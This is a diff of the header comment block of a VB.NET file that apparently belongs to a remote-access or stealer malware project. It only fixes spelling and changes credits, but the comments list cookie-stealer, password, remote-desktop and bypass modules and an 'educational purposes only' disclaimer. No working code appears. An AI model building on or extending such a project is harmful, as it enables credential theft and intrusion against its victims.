@@ -12,12 +12,12 @@ Imports System.Security.Principal
 ' Socket By: Black.Hacker
 ' ByPassSCP By: Black.Hacker
 ' Watchdog By: Black.Hacker
-' UDP Modifed By: Black.Hacker
+' UDP Modified By: Black.Hacker
 ' Cookies Stealers By: Black.Hacker
-' PasswordPlugin By: Black.Hacker
+' PasswordPlugin Modified By: Black.Hacker
 ' RemoteDesktop By: Black.Hacker
 ' 
-' Thx to : Nyan Cat, KFC, NirSoft
+' Thx to : Nyan Cat, KFC, Underc0de
 ' Copyright (c) DarkSoftwareCo & Black.Hackr
 '
 ' This Project is for educational purposes only.
